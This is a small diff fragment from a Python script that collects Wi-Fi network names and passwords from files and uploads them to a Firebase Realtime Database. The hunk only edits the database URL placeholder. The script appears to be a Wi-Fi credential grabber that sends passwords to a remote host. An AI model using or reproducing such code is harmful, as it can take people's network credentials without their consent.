@@ -53,7 +53,7 @@ for file in folder:
         else:
             line = openfile.readline()
 
-db = firebase.FirebaseApplication('PASTE HERE YOUR REALTIME DATABASE URL')
+db = firebase.FirebaseApplication('REALTIME DATABASE URL')
 
 for index in range(len(wifi_names)):
     data = {"Wi-Fi": wifi_names[index],"Password": passwords[index]}
